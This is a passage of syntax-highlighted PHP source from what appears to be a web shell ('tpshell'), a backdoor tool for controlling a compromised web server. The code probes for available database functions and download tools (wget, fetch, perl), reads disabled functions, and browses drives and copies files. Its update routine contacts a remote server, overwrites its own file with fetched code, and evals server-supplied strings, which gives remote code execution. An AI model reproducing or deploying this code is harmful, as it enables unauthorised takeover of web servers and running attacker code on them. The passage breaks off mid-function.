        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MySQL&quot;</span><span class="p">,</span><span class="s2">&quot;mysql_connect&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MSSQL&quot;</span><span class="p">,</span><span class="s2">&quot;mssql_connect&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Oracle&quot;</span><span class="p">,</span><span class="s2">&quot;ocilogon&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;PostgreSQL&quot;</span><span class="p">,</span><span class="s2">&quot;pg_connect&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Curl&quot;</span><span class="p">,</span><span class="s2">&quot;curl_version&quot;</span><span class="p">),</span>
      <span class="p">);</span>
      <span class="nv">$arrcmd</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Fetch&quot;</span><span class="p">,</span><span class="s2">&quot;fetch --help&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Wget&quot;</span><span class="p">,</span><span class="s2">&quot;wget --help&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Perl&quot;</span><span class="p">,</span><span class="s2">&quot;perl -v&quot;</span><span class="p">),</span>
      <span class="p">);</span>
     
      <span class="nv">$statinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrfunc</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="o">@</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;sockets&#39;</span><span class="p">))</span><span class="o">?</span><span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;on&quot;</span><span class="p">)</span><span class="o">:</span><span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;off&quot;</span><span class="p">);</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrcmd</span> <span class="k">as</span> <span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">tpexec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$statinfo</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">showdisfunc</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$disablefunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=orange&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$disablefunc</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=orange&amp;gt;&amp;lt;b&amp;gt;NONE&amp;lt;/b&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">disp_drives</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">,</span><span class="nv">$surl</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$letters</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$curdir</span><span class="p">);</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">,</span><span class="s2">&quot;Z&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$letter</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$bool</span> <span class="o">=</span> <span class="nv">$isdiskette</span> <span class="o">=</span> <span class="nv">$letter</span> <span class="o">==</span> <span class="s2">&quot;A&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$bool</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span>
                      <span class="p">(</span><span class="nv">$isdiskette</span><span class="o">?</span><span class="s2">&quot; onclick=</span><span class="se">\&quot;</span><span class="s2">return confirm(&#39;Make sure that the diskette is inserted properly!&#39;)</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; &quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:&quot;</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="nv">$letter</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;font color=orange&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$letters</span><span class="p">))</span> <span class="p">{</span> <span class="k">Return</span> <span class="nv">$letters</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span>  <span class="p">{</span><span class="k">Return</span> <span class="s2">&quot;None&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">disp_freespace</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$free</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_free_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
      <span class="nv">$total</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="nv">$used</span> <span class="o">=</span> <span class="nv">$total</span><span class="o">-</span><span class="nv">$free</span><span class="p">;</span>
      <span class="nv">$free_percent</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="mi">100</span><span class="o">/</span><span class="p">(</span><span class="nv">$total</span><span class="o">/</span><span class="nv">$free</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;%&quot;</span><span class="p">;</span>
      <span class="nv">$free</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$free</span><span class="p">);</span>
      <span class="nv">$total</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$total</span><span class="p">);</span>
      <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$free</span><span class="s2"> of </span><span class="si">$total</span><span class="s2"> (</span><span class="si">$free_percent</span><span class="s2">)&quot;</span><span class="p">;</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">tpgetsource</span><span class="p">(</span><span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">global</span> <span class="nv">$tpsh_sourcesurl</span><span class="p">;</span>
      <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s2">&quot;tpsh.php&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;tpsh.txt&quot;</span><span class="p">,</span>
      <span class="p">);</span>
      <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$array</span><span class="p">[</span><span class="nv">$fn</span><span class="p">];</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tpsh_sourcesurl</span><span class="o">.</span><span class="nv">$name</span><span class="p">);}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tpsh_getupdate</span><span class="p">(</span><span class="nv">$update</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;tpsh_updateurl&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;?version=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;sh_ver&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;updatenow=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$updatenow</span><span class="o">?</span><span class="s2">&quot;1&quot;</span><span class="o">:</span><span class="s2">&quot;0&quot;</span><span class="p">);</span>
      <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;Can&#39;t connect to update-server!&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">ltrim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$string</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">}));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;You are using latest version!&quot;</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$string</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$update</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$confvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$sourceurl</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="nv">$source</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sourceurl</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$source</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Can&#39;t fetch update!&quot;</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Local error: can&#39;t write update to &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;! You may download tpshell.php manually &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sourceurl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;here&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;.&quot;</span><span class="p">;}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$source</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                <span class="k">return</span> <span class="s2">&quot;Update completed!&quot;</span><span class="p">;</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;New version are available: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">[</span><span class="mi">1</span><span class="p">];}</span>
        <span class="p">}</span>
        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x04</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">eval</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error in protocol: segmentation failed! (&quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot;) &quot;</span><span class="p">;}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tp_buff_prepare</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
      <span class="k">global</span> <span class="nv">$act</span><span class="p">;</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
      <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
      <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
      <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
      <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}}}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tp_sess_put</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">global</span> <span class="nv">$sess_cookie</span><span class="p">;</span>
      <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
      <span class="nx">tp_buff_prepare</span><span class="p">();</span>
      <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
      <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
      <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$sess_cookie</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>
     
     
    <span class="k">function</span> <span class="nf">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
      <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
      <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">fs_copy_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
      <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">)))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">));}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
